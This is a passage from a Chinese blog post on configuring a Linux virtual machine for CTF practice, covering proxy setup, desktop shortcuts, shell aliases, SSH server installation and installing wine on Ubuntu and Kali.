https://download2.typoraio.cn/linux/typora_1.6.6_amd64.deb --output-document typora.deb  <span class="token comment"># ARM</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_arm64.deb --output-document typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  安装 Typora：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新建 md 文本文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">typora md文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在终端通过 typora 来打开 md 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 一般情况下，typora 为默认的 md 文本编辑器，直接使用这条命令即可</span><span class="token function">open</span> md文件名<span class="token comment"># -----------------------------------------</span><span class="token comment"># 如果 typora 不是默认的 md 文本编辑器</span><span class="token function">open</span> <span class="token parameter variable">-a</span> typora md文件名<span class="token comment"># 也可以直接将 open -a typora 取一个别名，比如：typora，避免繁琐的输入</span><span class="token comment"># 如果使用了 zsh 终端则打开 ~/.zshrc，如果使用默认终端则打开 ~/.bashrc</span><span class="token function">sudo</span> <span class="token function">vim</span> ~/.zshrc<span class="token comment"># 将以下两虚线之间的命令写入 zshrc 文件的末尾：</span><span class="token comment"># ----------------------------------------</span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">typora</span><span class="token operator">=</span><span class="token string">"open -a typora"</span><span class="token comment"># ----------------------------------------</span><span class="token comment"># 使配置生效：</span><span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># 然后就可以通过以下命令使用 typora 打开 md 文件：</span>typora md文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="虚拟机代理"><a href="#虚拟机代理" class="headerlink" title="虚拟机代理"></a>虚拟机代理</h2><h3 id="虚拟机走物理机代理（推荐）"><a href="#虚拟机走物理机代理（推荐）" class="headerlink" title="虚拟机走物理机代理（推荐）"></a>虚拟机走物理机代理（推荐）</h3><p>将虚拟机网络模式设置为 NAT 或桥接模式 （<em>两种方式下对应的物理机 IP 地址不一样</em>，<strong>虚拟机在 NAT 模式下走物理机的 VMnet8 虚拟网卡</strong>，<strong>桥接模式下走物理机的 VMnet0 虚拟网卡</strong>）</p><p>这里以 NAT 模式为例，假设物理机 IP 为 192.168.148.1</p><hr><h4 id="通过-clash-走代理"><a href="#通过-clash-走代理" class="headerlink" title="通过 clash 走代理"></a>通过 clash 走代理</h4><p>物理机在 clash 主界面中打开“局域网代理”（Allow LAN），并查看代理端口，以 7890 为例</p><p>在虚拟机中按参数手动设置代理即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Linux虚拟机CTF环境搭建12.png"></p><hr><h4 id="通过-v2rayN-走代理"><a href="#通过-v2rayN-走代理" class="headerlink" title="通过 v2rayN 走代理"></a>通过 v2rayN 走代理</h4><p>物理机在 v2rayN 中打开：<code>设置 -&gt; 参数设置 -&gt; 允许来自局域网的连接</code></p><p>在 v2rayN 主界面中，查看局域网的 socks5 和 http 端口号：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" alt="Linux虚拟机CTF环境搭建10.png"></p><p>在虚拟机中按参数手动设置代理即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Linux虚拟机CTF环境搭建11.png"></p><hr><h3 id="虚拟机自身安装-clash"><a href="#虚拟机自身安装-clash" class="headerlink" title="虚拟机自身安装 clash"></a>虚拟机自身安装 clash</h3><p>下载：<a href="https://github.com/Dreamacro/clash">GitHub - Dreamacro&#x2F;clash: A rule-based tunnel in Go.</a></p><p>以 clash-linux-amd64-v1.6.5.gz 为例</p><p>右键解压并重命名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> clash-linux-amd64 clash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为方便在任何位置启动 clash，将其移动到 <code>/usr/bin</code> 目录下，并启动 clash 进行初始化：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x clash<span class="token function">sudo</span> <span class="token function">mv</span> clash /usr/bin/clash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>初始化执行 clash 会默认在 <code>~/.config/clash/</code> 目录下生成配置文件和全球 IP 地址库：<code>config.yaml</code> 和 <code>Country.mmdb</code></p><p>直接将你的 yaml 配置文件替换 <code>~/.config/clash/</code> 目录下的 <code>config.yaml</code> 即可</p><blockquote><p>开启 clash 后，浏览器输入：<code>http://clash.razord.top/#/proxies</code> 进入 clash 的控制台 （浏览器的设置中，代理选项可能需要设置为使用系统代理）</p></blockquote><hr><h4 id="Ubuntu-22-04-配置"><a href="#Ubuntu-22-04-配置" class="headerlink" title="Ubuntu 22.04 配置"></a>Ubuntu 22.04 配置</h4><p>每次使用 clash 前，在设置中将代理设为手动，参数如下： （最底下那个可以不用管）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1.png" alt="Linux虚拟机CTF环境搭建1.png"></p><hr><h4 id="Kali-2022-4-配置"><a href="#Kali-2022-4-配置" class="headerlink" title="Kali 2022.4 配置"></a>Kali 2022.4 配置</h4><p>进入 <code>/etc/profile.d</code> 目录，新建文件 <code>proxy.sh</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/profile.d<span class="token function">sudo</span> <span class="token function">vim</span> proxy.sh<span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------<span class="token builtin class-name">export</span> <span class="token assign-left variable">proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span><span class="token variable">$proxy</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span><span class="token variable">$proxy</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_PROXY</span><span class="token operator">=</span><span class="token variable">$proxy</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTPS_PROXY</span><span class="token operator">=</span><span class="token variable">$proxy</span>-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> proxy.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启 clash，检查网络代理服务器是否配置成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clash<span class="token comment"># 另开一个终端</span><span class="token function">curl</span> google.com<span class="token comment"># 如果配置失败：</span><span class="token comment"># curl: (7) Failed to connect to 127.0.0.1 port 7890 after 0 ms: Couldn't connect to server</span><span class="token comment"># 如果配置成功：</span><span class="token comment"># &lt;HTML>&lt;HEAD>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"></span><span class="token comment"># &lt;TITLE>301 Moved&lt;/TITLE>&lt;/HEAD>&lt;BODY></span><span class="token comment"># &lt;H1>301 Moved&lt;/H1></span><span class="token comment"># The document has moved</span><span class="token comment"># &lt;A HREF="http://www.google.com/">here&lt;/A>.</span><span class="token comment"># &lt;/BODY>&lt;/HTML></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>以上配置的是终端的代理，浏览器的代理需要在浏览器中单独设置</p></blockquote><p>在火狐浏览器中，搜索代理，将参数设置为：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3.png" alt="Linux虚拟机CTF环境搭建3.png"></p><hr><h2 id="创建桌面快捷方式并添加到开始菜单"><a href="#创建桌面快捷方式并添加到开始菜单" class="headerlink" title="创建桌面快捷方式并添加到开始菜单"></a>创建桌面快捷方式并添加到开始菜单</h2><p>以 IDA 为例，在桌面打开终端</p><p>新建一个 IDA-Freeware-8.2.desktop 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">vim</span> IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>并写入以下内容： （注意按照自己实际情况修改路径）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">0.9</span>.4<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>IDA Freeware <span class="token number">8.2</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>Interactive Disassembler Freeware <span class="token number">8.2</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/idafree-8.2/appico64.png<span class="token assign-left variable">Exec</span><span class="token operator">=</span>/opt/idafree-8.2/ida64<span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">MimeType</span><span class="token operator">=</span>application/octet-stream<span class="token punctuation">;</span>application/mac-binary<span class="token punctuation">;</span>application/macbinary<span class="token punctuation">;</span>application/octet-stream<span class="token punctuation">;</span>application/x-binary<span class="token punctuation">;</span>application/x-macbinary<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">含义</th><th align="left">必要性</th></tr></thead><tbody><tr><td align="left"><code>[Desktop Entry]</code></td><td align="left">文件头，每个 Desktop 文件都以这个标签开始</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Version</code></td><td align="left">标明 Desktop Entry 的版本</td><td align="left">可选</td></tr><tr><td align="left"><code>Type</code></td><td align="left">Desktop 的类型, 常见值有 Application 和 Link</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Name</code></td><td align="left">程序名称，可自定义</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Comment</code></td><td align="left">程序描述，可自定义</td><td align="left">可选</td></tr><tr><td align="left"><code>Icon</code></td><td align="left">设置快捷方式的图标，支持 png 和 svg</td><td align="left">可选</td></tr><tr><td align="left"><code>Exec</code></td><td align="left">程序的启动命令, 可以带参数运行, 当 Type 为 Application 时有效</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Terminal</code></td><td align="left">是否在终端中运行, 当 Type 为 Application 时有效 <em>（对于没有图形界面的程序很有用）</em></td><td align="left">可选</td></tr><tr><td align="left"><code>MimeType</code></td><td align="left">设置该程序可以打开的文件类型</td><td align="left">可选</td></tr><tr><td align="left"><code>StartupNotify</code></td><td align="left">程序启动通知</td><td align="left">可选</td></tr></tbody></table><p>其他 <code>MimeType</code> 可打开的文件类型：<a href="https://blog.csdn.net/zhaoyw2008/article/details/46647723">完整的 mime type 列表-CSDN博客</a></p><p>增加执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后将 .desktop 文件存放到 <code>/usr/share/applications/</code> 目录下</p><p>程序就会现在开始菜单中，同时也可以在 <code>右键 -&gt; 使用其他应用程序打开</code> 中找到，然后也可以自己将应用固定到任务栏，方便打开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">mv</span> IDA-Freeware-8.2.desktop /usr/share/applications/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>jetbrains 全家桶等等创建桌面快捷方式就简单了，运行软件后：<code>工具栏 –&gt; Tools –&gt; Create Desktop Entery</code></p><p>以 Pycharm 自动创建的图标为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">1.0</span><span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>PyCharm Professional Edition<span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/pycharm-2022.3/bin/pycharm.svg<span class="token assign-left variable">Exec</span><span class="token operator">=</span><span class="token string">"/opt/pycharm-2022.3/bin/pycharm.sh"</span> %f<span class="token assign-left variable">Comment</span><span class="token operator">=</span>Python IDE <span class="token keyword">for</span> Professional Developers<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Development<span class="token punctuation">;</span>IDE<span class="token punctuation">;</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">StartupWMClass</span><span class="token operator">=</span>jetbrains-pycharm<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="创建软连接将应用添加到终端启动"><a href="#创建软连接将应用添加到终端启动" class="headerlink" title="创建软连接将应用添加到终端启动"></a>创建软连接将应用添加到终端启动</h2><p>以 IDA 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token string">"/opt/idafree-8.2/ida64"</span> /usr/bin/ida<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在终端输入 <code>ida</code> 即可打开 IDA</p><blockquote><p><code>/usr/bin/ida</code> 中的 ida 名字可以自定义</p><p>这样只是在 <code>/usr/bin/</code> 下创建了一个软链接，指向 <code>/opt/idafree-8.2/ida64</code><br>若想删除软链接：</p><pre class="line-numbers language-none"><code class="language-none">unlink 软链接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尽量不要用 <code>rm -rf</code> 删除软链接，如果不小心加上 <code>&#39;/&#39;</code> 就会删除源文件，例如：<code>rm -rf filename/</code></p></blockquote><hr><h2 id="终端将-cd-命令与-ls-命令连用"><a href="#终端将-cd-命令与-ls-命令连用" class="headerlink" title="终端将 cd 命令与 ls 命令连用"></a>终端将 cd 命令与 ls 命令连用</h2><blockquote><p>其实就是将 <code>cd xxx</code> 命令变为 <code>cd xxx &amp;&amp; ls</code>，好处也显而易见：可以少敲一条命令，方便~</p><p>但是 Ubuntu 不支持 <code>chdir</code>，所以不能直接用 <code>alias</code> 实现目录内容的显示</p></blockquote><p>注：以下操作对 Kali Linux 同样适用</p><p>如果你的 Ubuntu 配置了 zsh 终端，编辑 <code>~/zshrc</code> 配置文件（Kali Linux 自带 zsh 终端）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span class="token comment"># 如果没有配置 zsh 终端，则打开 ~/.bashrc</span><span class="token function">sudo</span> gedit ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在文件最后加入以下内容，保存退出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># 如果没有配置 zsh 终端，则使用如下命令</span><span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到效果了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA29.png" alt="Linux虚拟机CTF环境搭建29.png"></p><p>如果想顺便显示当前所在路径，只需将前面的内容改为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">pwd</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到效果了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA30.png" alt="Linux虚拟机CTF环境搭建30.png"></p><hr><h2 id="配置-SSH-服务端"><a href="#配置-SSH-服务端" class="headerlink" title="配置 SSH 服务端"></a>配置 SSH 服务端</h2><blockquote><p>Linux 默认只安装了 SSH 客户端，有时候在执行 ssh 或者 scp 命令时会出现：<code>ssh: connect to host port 22: Connection refused</code> 拒绝连接</p><p>客户端和服务端的关系：<br>如果 A 机器想被 B 机器远程控制，那么 A 机器需要安装 SSH 服务端，B 机器需要安装 SSH 客户端<br>例如：B 机器通过 ssh 连接 A 机器，或者 B 机器通过 scp 上传文件到 A 机器</p></blockquote><p>查看 ssh 服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只显示有 openssh-client 没有 openssh-server，说明未安装 SSH 服务端</p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>确认 ssh-server 是否启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看到 <code>sshd</code> 就说明 ssh-server 已经启动</p><p>如果出现其他问题的话，查看 SSH 服务端状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启 SSH 服务端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相关命令：</p><ul><li>连接服务端机器，假设 IP 为 192.168.1.1，用户名为 user （Windows、Linux 通用）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> user@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>从客户端机器上传当前目录下的 test 文件到服务端机器的 <code>~/</code> 或 <code>E:\</code> 目录下，假设 IP 为 192.168.1.1，用户名为 user</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 服务端为 Linux</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:~/<span class="token comment"># 服务端为 Windows</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:E:<span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实只传文件的话，不需要 <code>-r</code> 参数，但是传文件夹需要，索性直接加上 <code>-r</code> 更方便</p><p>如果使用 ssh 连接出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span>Someone could be eavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span>It is also possible that a <span class="token function">host</span> key has just been changed.<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Host key verification failed.lost connection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此报错是由于远程的主机的公钥发生了变化导致的</p><p>解决办法：<br>清除 ssh 所连接的 IP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-R</span> 出问题的IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再使用 ssh 重新连接即可</p><hr><h2 id="安装-wine-8"><a href="#安装-wine-8" class="headerlink" title="安装 wine 8"></a>安装 wine 8</h2><blockquote><p>使用 wine 可以在 Linux 下运行 Windows 程序</p><p>感觉有些软件还是不太稳定，可以体验一下，但是不用太过依赖，看个人习惯吧</p><p>官方文档：<a href="https://wine.htmlvalidator.com/install-wine-on-ubuntu-22.04.html">Ubuntu 22.04 – How to Install Wine on Ubuntu 22.04</a></p></blockquote><p>查看是否安装 32 位架构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg --print-foreign-architectures<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若输出 <code>i386</code> 则跳过下面一步，否则安装 32 位架构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg --add-architecture i386<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载并添加 WineHQ 存储库密钥：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> <span class="token parameter variable">-O</span> /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加官方 Wine 存储库（针对 <code>Ubuntu 22.04 LTS &quot;Jammy Jellyfish&quot;</code> 或基于它的 Linux 发行版，如 <code>Linux Mint 21.x</code>）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> <span class="token parameter variable">-NP</span> /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/ubuntu/dists/jammy/winehq-jammy.sources<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>/etc/apt/sources.list.d/winehq-jammy.sources</code> 文件，修改为国内源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.list.d/winehq-jammy.sources<span class="token comment"># 将整个文件内容替换为下面两个----之间的内容</span>-----------------------------------------------------------------Types: debURIs: https://mirrors.tuna.tsinghua.edu.cn/wine-builds/ubuntuSuites: jammyComponents: mainArchitectures: amd64 i386Signed-By: /etc/apt/keyrings/winehq-archive.key-----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更新数据库并安装 wine：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> winehq-stable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装好后默认在 <code>/opt/wine-stable</code> 文件夹下</p><p>验证安装：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA14.png" alt="Linux虚拟机CTF环境搭建14.png"></p><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wine exe程序<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以 wine 启动 Windows 下的 x64dbg 为例：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA16.png" alt="Linux虚拟机CTF环境搭建16.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA15.png" alt="Linux虚拟机CTF环境搭建15.png"></p><hr><h2 id="更新-snap-商店"><a href="#更新-snap-商店" class="headerlink" title="更新 snap 商店"></a>更新 snap 商店</h2><blockquote><p>如果有小伙伴喜欢在 snap 商店中安装软件，就会发现当在 snap 商店中更新软件的时候，更新到 Snap Store 时总是会报错，提示无法更新（其实原因很简单，只是单纯因为 snap 商店无法自己更新自己。。。）</p></blockquote><p>更新 snap 商店需要在终端进行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap refresh snap-store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">错误：cannot refresh <span class="token string">"snap-store"</span><span class="token builtin class-name">:</span> snap <span class="token string">"snap-store"</span> has running apps         <span class="token punctuation">(</span>ubuntu-software<span class="token punctuation">)</span>, pids: <span class="token number">2150</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说明 snap 商店正在运行，pid 为 2150，需要先关闭 snap 商店再进行更新：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">kill</span> <span class="token number">2150</span>   <span class="token comment"># 注意改为自己的 snap 商店 pid</span><span class="token function">sudo</span> snap refresh snap-store<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> Linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中加密算法特征与解密</title>
      <link href="/posts/52521377.html"/>
      <url>/posts/52521377.html</url>
      
